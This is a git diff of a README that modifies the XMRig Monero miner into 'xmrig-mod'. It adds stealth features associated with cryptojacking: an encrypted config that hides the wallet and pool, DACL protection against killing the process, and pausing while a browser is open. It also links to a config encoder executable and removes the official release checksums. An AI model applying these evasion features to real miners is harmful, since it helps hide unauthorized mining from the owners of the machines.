@@ -1,13 +1,7 @@
-# XMRig
+# xmrig-mod
+:warning: Only for legal usage and for education!
 
 :warning: **If you mine Monero, Aeon, Sumokoin, Turtlecoin, Stellite, GRAFT, Haven Protocol, IPBC, [PLEASE READ](https://github.com/xmrig/xmrig/issues/482)!** :warning:
-
-[![Github All Releases](https://img.shields.io/github/downloads/xmrig/xmrig/total.svg)](https://github.com/xmrig/xmrig/releases)
-[![GitHub release](https://img.shields.io/github/release/xmrig/xmrig/all.svg)](https://github.com/xmrig/xmrig/releases)
-[![GitHub Release Date](https://img.shields.io/github/release-date-pre/xmrig/xmrig.svg)](https://github.com/xmrig/xmrig/releases)
-[![GitHub license](https://img.shields.io/github/license/xmrig/xmrig.svg)](https://github.com/xmrig/xmrig/blob/master/LICENSE)
-[![GitHub stars](https://img.shields.io/github/stars/xmrig/xmrig.svg)](https://github.com/xmrig/xmrig/stargazers)
-[![GitHub forks](https://img.shields.io/github/forks/xmrig/xmrig.svg)](https://github.com/xmrig/xmrig/network)
 
 XMRig is a high performance Monero (XMR) CPU miner, with official support for Windows.
 Originally based on cpuminer-multi with heavy optimizations/rewrites and removing a lot of legacy code, since version 1.0.0 completely rewritten from scratch on C++.
@@ -25,17 +19,21 @@ Originally based on cpuminer-multi with heavy optimizations/rewrites and removin
 * [Build](https://github.com/xmrig/xmrig/wiki/Build)
 * [Common Issues](#common-issues)
 * [Other information](#other-information)
+* [How to encrypt config](#how-to-encrypt)
 * [Donations](#donations)
 * [Release checksums](#release-checksums)
 * [Contacts](#contacts)
 
 ## Features
 * High performance.
+* Caesar encrypted config
 * Official Windows support.
 * Small Windows executable, without dependencies.
 * x86/x64 support.
+* DACL Process Security
 * Support for backup (failover) mining server.
 * keepalived support.
+* Stop when you use browser
 * Command line options compatible with cpuminer.
 * CryptoNight-Lite support for AEON.
 * Smart automatic [CPU configuration](https://github.com/xmrig/xmrig/wiki/Threads).
@@ -103,6 +101,15 @@ Since version 0.8.0.
 * No TLS support.
 * Default donation 5% (5 minutes in 100 minutes) can be reduced to 1% via command line option `--donate-level`.
 
+## How to encrypt
+* Download [Config Encrypter](https://github.com/TheDevFromKer/Panel-RIG/blob/master/Config_Encoder/encode_config.exe)
+* Enter shift, pool and wallet
+* Shift in HEX format paste in:
+```
+int shift = HERE;
+```
+* And other by name
+
 
 ### CPU mining performance
 * **Intel i7-7700** - 307 H/s (4 threads)
@@ -121,14 +128,6 @@ Please note performance is highly dependent on system load. The numbers above ar
 * XMR: `48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD`
 * BTC: `1P7ujsXeX7GxQwHNnJsRMgAdNkFZmNVqJT`
 
-## Release checksums
-### SHA-256
-```
-f8e1957e8bfd7f281a76d1e42694049c67f39dea90ac36e9d589c14cdf8924bc xmrig-2.6.1-xenial-amd64.tar.gz/xmrig-2.6.1/xmrig
-472c7aaf5aacc1212bfd3f2f96daca4f42d64e2d0db0872891328e7d8503d0c8 xmrig-2.6.1-gcc-win32.zip/xmrig.exe
-d53154cef24c884b2be539ac13bfb6e7dba6bbc53b62e91f2877637d43fa4b15 xmrig-2.6.1-gcc-win64.zip/xmrig.exe
-a253381b617463e6e1193d49b8afbf720a1c376621da7429d97f192668cd59ad xmrig-2.6.1-msvc-win64.zip/xmrig.exe
-```
 
 ## Contacts
 * support@xmrig.com
